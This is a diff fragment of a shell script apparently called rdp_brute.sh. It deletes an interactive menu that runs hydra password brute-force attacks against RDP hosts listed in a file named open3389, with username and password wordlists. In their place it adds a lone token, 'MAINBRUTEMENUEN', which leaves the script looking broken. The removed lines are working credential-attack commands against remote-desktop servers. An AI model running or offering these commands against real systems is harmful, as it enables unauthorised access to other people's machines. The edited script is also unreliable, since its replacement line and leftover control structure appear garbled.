@@ -12614,56 +12614,11 @@ rm -f hydra.restore 2> /dev/null
 fi
 
 echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
 
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-else
-if [ "$menuoption" = "5" ]; then
+MAINBRUTEMENUEN
 
 exit;
 
-fi
 fi
 fi
 fi
